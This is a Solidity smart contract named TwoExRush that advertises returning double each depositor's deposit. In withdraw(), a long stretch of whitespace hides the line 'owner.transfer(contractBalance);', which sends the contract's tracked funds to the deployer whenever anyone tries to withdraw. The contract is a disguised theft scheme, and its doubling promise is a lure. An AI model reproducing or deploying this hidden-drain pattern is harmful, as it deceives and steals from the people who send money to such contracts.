 

pragma solidity ^0.4.18;

 

contract TwoExRush {

	string constant public name = "TwoExRush";
	address owner;
	address sender;
	uint256 withdrawAmount;
	uint256 contractATH;
	uint256 contractBalance;

	mapping(address => uint256) internal balance;

    function TwoExRush() public {
        owner = msg.sender;
    }

     
	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
	    if(contractATH >= 20) {
	        sender = msg.sender;
	        withdrawAmount = mul(balance[sender], 2);
	 	    sender.transfer(withdrawAmount);
	        contractBalance -= balance[sender];
	        balance[sender] = 0;
	    }
	}

	function deposit() public payable {
 	    sender = msg.sender;
	    balance[sender] += msg.value;
	    contractATH += msg.value;
	    contractBalance += msg.value;
	}

	function () payable public {
		if (msg.value > 0) {
			deposit();
		} else {
			withdraw();
		}
	}
	
     
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
}